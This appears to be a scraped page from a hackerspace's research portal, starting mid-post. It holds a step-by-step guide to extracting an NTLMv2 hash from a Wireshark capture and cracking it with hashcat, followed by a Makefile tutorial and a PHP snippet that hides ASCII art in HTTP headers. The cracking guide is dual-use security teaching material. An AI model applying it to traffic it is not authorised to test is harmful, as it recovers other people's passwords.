\n\nusername::domain:ServerChallenge:NTproofstring:modifiedntlmv2response\n\n![](2018/12/image-12.png)\n\n9. Find your favorite password list (RockYou? best_1000_passwords2018.txt?) and open a terminal to use hashcat to run:\n\n\u003e hashcat -m 5600 crackme.txt passwordlist.txt \n\nand it will give you the user's password!\n\n![](2018/12/image-13.png \"congrats on the hax!\")\n\nsources for more information:\n\n- [https://www.root9b.com/newsroom/attacking-windows-fallback-authentication/](https://www.root9b.com/newsroom/attacking-windows-fallback-authentication/)\n- [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)\n","cover":"2018/12/CredUIHTTPAuth.jpg","author":{"name":"kimb3r","avatar":"avatars/kimb3r.jpg"},"content":"\n1. Open your .pcap that contains an NTLMv2 hash in Wireshark.\n2. Filter by ntlmssp to get the authentication handshake.\n\n![](2018/12/image-3.jpg \"artisanal smb2 authentication packets\")\n\n3. In this case, we get three packets. Find the NTLMSSP_AUTH packet. Filter the packet down to the Security Blob layer to get to the juicy good stuff:\n\n![](2018/12/image-5.png \"the goods\")\n\n4. Copy out the domain name and user name to a text document.\n\n5. Drill down into the NTLM Response section to find NTProofStr and NTLMv2 response. Copy both of these out to the text document as a Hex String. \n\n![](2018/12/image-6.jpg \"cross the streams\")\n\n6. Notice that NTLMv2Response begins with the ntlmProofStr, so delete the ntlmProofStr from the NTLMv2Response.\n\n![](2018/12/image-7.jpg)\n\n7. Enter ntlmssp.ntlmserverchallenge into the search filter. This will highlight the packet where the NTLM Server Challenge is found, generally the packet before the NTLM_Auth packet. Copy this value to the text document as a Hex String. \n\n![](2018/12/image-8.jpg)\n\n8. Put the values into the following format and save it as crackme.txt: \n\nusername::domain:ServerChallenge:NTproofstring:modifiedntlmv2response\n\n![](2018/12/image-12.png)\n\n9. Find your favorite password list (RockYou? best_1000_passwords2018.txt?) and open a terminal to use hashcat to run:\n\n\u003e hashcat -m 5600 crackme.txt passwordlist.txt \n\nand it will give you the user's password!\n\n![](2018/12/image-13.png \"congrats on the hax!\")\n\nsources for more information:\n\n- [https://www.root9b.com/newsroom/attacking-windows-fallback-authentication/](https://www.root9b.com/newsroom/attacking-windows-fallback-authentication/)\n- [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)\n"},{"title":"Makefiles, but in English: Part 1","slug":"makefiles-but-in-english-part-1","date_published":1544659200000,"date_updated":1545104230000,"tags":["how to","Makefile"],"excerpt":"Make is intelligent enough to be able to distinguish between them at runtime. But it's probably best to avoid storing different types in a variable.","cover":"2018/12/makefile-1.jpg","author":{"name":"David Freitag","avatar":"avatars/david-freitag.jpg"},"content":"\nIn this multi-part series, I will be covering Makefiles and the general behavior of Make itself. The only real prerequisite knowledge needed is a general understanding of Bash and the common Bash builtins. We are going to cover variables, functions, builtins (variables and functions), rules, and recipes. By the time you are done with this series, you should have a confident grasp of Makefiles and have the ability to quickly get started with any project. However, before I get started I'd like to make a few points. First, this series is not intended to serve as a reference for Make. Instead, it will give you a basic understanding of how to get started and, more importantly, it will give you a set of keywords to supplement your googlefu. Secondly, the snippets and examples that follow are tested using GNU Make v4.1. There exist several different versions and indeed completely different implementations of Make. There may be slight syntax differences in these different versions and implementations of Make, but the keywords in this series should point you in the right direction.\n\n# Part 1a: Make Variables\n\nMakefiles, at a very basic level, are more or less script files. They allow the user to define functions, variables, they begin \"execution\" from the first line, and continue until termination. To define a variable in a Makefile, simply declare it with a name, followed by an assignment operator, followed by the value. For example: `FOO = BAR` will define a variable named `FOO`, with the value `BAR`. The actual value you set only becomes important in the context which it is used. Syntactically speaking, there is no requirement that Makefile variables be capitalized, but it immediately distinguishes them from functions and builtins; to each their own.\n\nAlthough Make variables behave similar to Environmental Variables, these values are not globally set. For example, if you define some value `FOO` in your makefile, you will not see that value present in your C file (unless you explicitly instruct your compiler to). Similar to Bash, Make does not really have a type system, a variable defined to a string can later be assigned to an integer. Make itself is intelligent enough to be able to make the distinction between them at runtime. That being said, it is probably best to avoid storing different types in a variable.\n\nThere are a series of [assignment operators](https://www.gnu.org/software/make/manual/html_node/Setting.html) in Make, and all of them behave slightly differently. Before I get into them, there is a concept which needs introducing, and that is expansion. If you are familiar with Bash and linux Environmental Variables, you should be familiar with the concept of expansion. Essentially, expansion is the evaluation of an assignment, whether it contains references to other variables or functions. Depending on the desired level of expansion, you can run into issues such as infinite recursion and infinite self-references. To address these issues, the authors of Make created different operators (actual operators in quotes to avoid confusion):\n\n- \"=\": Variable assignment using *recursive* expansion.\n- \":=\" and \"::=\": [\"Simple\" variable assignment](https://www.gnu.org/software/make/manual/html_node/Flavors.html#Flavors) using only a single level of expansion. This prevents infinite expansion or self reference. The difference between the single-colon and double-colon versions seems to be POSIX compliance, and does not work on older versions of Make.\n- \"?=\": Conditional variable assignment operator. This assignment will only occur if the variable being assigned to does not already exist. This is helpful for creating defaults for values which can be passed on the command line. Note that an empty value **does** count as being defined in Make.\n- \"+=\": [Append](https://www.gnu.org/software/make/manual/html_node/Appending.html) assignment operator. This operator concatenates a space followed by the assigned value. `FOO += bar` is the equivalent of saying `FOO := $(FOO) bar`. Note that we are using `:=` for a self-reference, using `=` can cause issues.\n\nNow that we can define variables, how do we refer to them in the rest of the Makefile? Both variables and builtins are referred to using the `$()` operator, for example:\n\n    FOO := foo\n    BAR := $(FOO) bar\n    \n\nIf you were to echo `BAR` in this Makefile, you would find that it contains `foo bar`.  This shows not only variable reference, but Make's extremely simple concatenation. Again, if you are familiar with Bash this should all be familiar. Let's break down exactly how this works. First, we assign the value of `FOO` using one level of expansion. The value we set is fixed, there are no variable references or builtins to expand, it's simply set. `BAR`, on the other hand, must expand the variable reference to `FOO`, get it's value, and concatenate \" bar\" onto it. Note the space.\n\n# Part 1b, Make builtin functions\n\n[Calling functions](https://www.gnu.org/software/make/manual/html_node/Syntax-of-Functions.html#Syntax-of-Functions) in Makefiles is similar to the way that variables are referenced, wih the `$()` operator. This is true for both builtin functions, and user-defined functions, however user-defined functions are slightly different. In a Makefile, it is possible to define custom functions, but they are rarely used, so I will primarily focus on using builtin functions. For the sake of brevity, I will not be covering every single builtin available to you in Make, but I will cover how they are used, and what kind of functions are available to you.\n\nTo call a function in Make, you first need to know the name of the function, and the arguments which it accepts. The arguent system in Make is not so concrete as you might expect, instead it differs slightly from function to function. For instance,\n`FOO := $(wildcard *.c)` creates a variable called `FOO` and assigns the value to the output of the [wildcard](https://www.gnu.org/software/make/manual/html_node/Wildcard-Function.html) function. This function outputs the names of all files in the current directory which match the specified pattern. The wildcard is commonly used for automatic source file detection in simple projects. Along with the wildcard function, there are several other types of functions which are available in Make:\n\n- [Text Functions](https://www.gnu.org/software/make/manual/html_node/Text-Functions.html#Text-Functions): General text manipulation functions. They can be used to do things like substitutions, pattern-based subsitutions, changing file extensions, etc\n- [Conditional Functions](https://www.gnu.org/software/make/manual/html_node/Conditional-Functions.html#Conditional-Functions): Provide a mechanism to implement a structure of logic within the Makefile.\n- [File](https://www.gnu.org/software/make/manual/html_node/File-Function.html#File-Function) and [File Name](https://www.gnu.org/software/make/manual/html_node/File-Name-Functions.html#File-Name-Functions) Functions: Provides the user with utilities to manipulate file names, and do simple file I/O\n- [Call Function](https://www.gnu.org/software/make/manual/html_node/Call-Function.html#Call-Function): Allows the user to call user-defined functions.\n\nThis is not an exhaustive list, for the full list of builtin functions see [this](https://www.gnu.org/software/make/manual/html_node/Functions.html).\n\n# Part 1c, user-defined functions\n\nLike some of the features in Make, user-defined functions exist to cover certain edge cases. You should not need them, but if you do you'll *really* need them. If you're familiar with C/C++ macros, then you will already be familiar with how Make user-defined functions work. The [O'Rielly Make open book](https://www.oreilly.com/openbook/make3/book/ch04.pdf) is a very good reference for user-defined functions. These functions must be defined on a single line, but the standard backslash notation will allow the user to split a function on to multiple lines.\n\n    define myfunction\n        echo \"Hello, World!\"\n    \n\nTo call this function, you use the `call` builtin function, `$(call myfunction)`\n\nThis section is glossed over for a few reasons. Chances are if you're using a Makefile user-defined function you're probably Doing It Wrongâ¢, it's already quite well documented in the linked book, and it's a fairly advanced feature of Make.\n"},{"title":"ASCII art in hidden places","slug":"ascii-art-in-hidden-places","date_published":1540949125000,"date_updated":1540949125000,"tags":["research","how to"],"excerpt":"Hiding data in new and interesting places has always been a fun objective for anyone who likes creating and solving challenges. One of the interesting secret hiding places for data I like to use is server headers.","cover":"2018/10/4TJDOj5.jpg","author":{"name":"Pips","avatar":"avatars/pips.jpg"},"content":"\nHiding data in new and interesting places has always been a fun objective for anyone who likes creating and solving challenges. One of the interesting secret hiding places for data I like to use is server headers. \n\nI found out that you can override server headers live in-page with PHP's `header()` function. Combine this with some ascii art, and in the header of a server response you can now show people super hidden ascii art.\n\n![](2018/10/image-15.png)\n\nHere's the code to make it happen. Replace the `$subject` with new ascii art. \n\n    \u003c?php\n    $i = 0;\n    $subject= \"\n    #    ,-''''-.\n    #   (.  ,.   L        ___...__\n    #   /7} ,-`  `'-==''``        ''._\n    #  //{                           '`.\n    #  \\_,X ,                         : )\n    #      7                          ;`\n    #      :                  ,       /\n    #       \\_,                \\     ;\n    #         Y   L_    __..--':`.    L\n    #         |  /| ````       ;  y  J\n    #         [ j J            / / L ;\n    #         | |Y \\          /_J  | |\n    #         L_J/_)         /_)   L_J\n    #        /_)                   /_)\";\n    $header_name= \"blackmagic-\";\n    foreach(preg_split(\"/((\\r?\\n)|(\\r\\n?))/\", $subject) as $line){\n    \n        $pre = \"\";\n        if($i\u003c10)\n            $pre = \"00\";\n        elseif ($i\u003c100)\n            $pre = \"0\";\n    \n    \n    \n        header( \"{$header_name}{$pre}{$i}: {$line}\");\n        $i++;\n    \n    }\n    ?\u003e\n    \n    \n"}],"pagination":{"totalPages":1,"totalItems":5,"currentPage":1}},"__N_SSG":true},"page":"/research-portal/tag/[tag]/[page]","query":{"tag":"how-to","page":"1"},"buildId":"y70QUYdHebLoQX-Opa56H","nextExport":false,"isFallback":false,"gsp":true,"head":[["meta",{"charSet":"utf-8"}],["title",{"children":"Research Portal: how to | 801 Labs"}],["meta",{"name":"description","content":"description"}],["link",{"rel":"canonical","href":"https://www.801labs.org/research-portal/tag/how-to/1"}],["link",{"rel":"icon","href":"/favicon.png","sizes":"16x16"}],["meta",{"property":"og:title","content":"Research Portal: how to | 801 Labs"}],["meta",{"property":"og:description","content":"Read our research articles, stories, biohacking, reverse engineering, how-to videos, and more!"}],["meta",{"property":"og:image","content":"https://www.801labs.org/images/801labs-cover.jpg"}],["meta",{"property":"og:url","content":"https://www.801labs.org/research-portal/tag/how-to/1"}],["meta",{"property":"og:site_name","content":"801 Labs"}],["meta",{"name":"twitter:card","content":"summary_large_image"}],["meta",{"name":"twitter:site","content":"@801Labs"}],["meta",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["meta",{"name":"theme-color","content":"#6bf0c2"}],["link",{"href":"https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,700;0,900;1,400\u0026family=Tomorrow:wght@400;600;700\u0026display=swap","rel":"stylesheet"}],["meta",{"name":"google-site-verification","content":"QnlAT_0caLTAeL1e8V-RlHWBX7xauM_CnxY_5-ltIF4"}]]}</script><script nomodule="" src="/_next/static/chunks/polyfills-08fbb0bb0c9e09648ed7.js"></script><script src="/_next/static/chunks/main-b734f4d0c2c599295fe6.js" async=""></script><script src="/_next/static/chunks/webpack-e067438c4cf4ef2ef178.js" async=""></script><script src="/_next/static/chunks/framework.464b393922c27508c360.js" async=""></script><script src="/_next/static/chunks/commons.baecec2b1f31cc8f0ab6.js" async=""></script><script src="/_next/static/chunks/pages/_app-e662323251d69bbbf5e5.js" async=""></script><script src="/_next/static/chunks/cb1608f2.9b44609261640b8f626b.js" async=""></script><script src="/_next/static/chunks/a9a7754c.53d20200875279da8636.js" async=""></script><script src="/_next/static/chunks/16bc220b6d50f93026463b2cd002c45681ffbe2f.62ec2799f7445d763091.js" async=""></script><script src="/_next/static/chunks/269ea3ef5216fdb5e29fe1b24ee03a8936e3d31a.bf08c7a312d87b9b94e6.js" async=""></script><script src="/_next/static/chunks/pages/research-portal/tag/%5Btag%5D/%5Bpage%5D-d037980a625fd369c695.js" async=""></script><script src="/_next/static/y70QUYdHebLoQX-Opa56H/_buildManifest.js" async=""></script><script src="/_next/static/y70QUYdHebLoQX-Opa56H/_ssgManifest.js" async=""></script></body></html>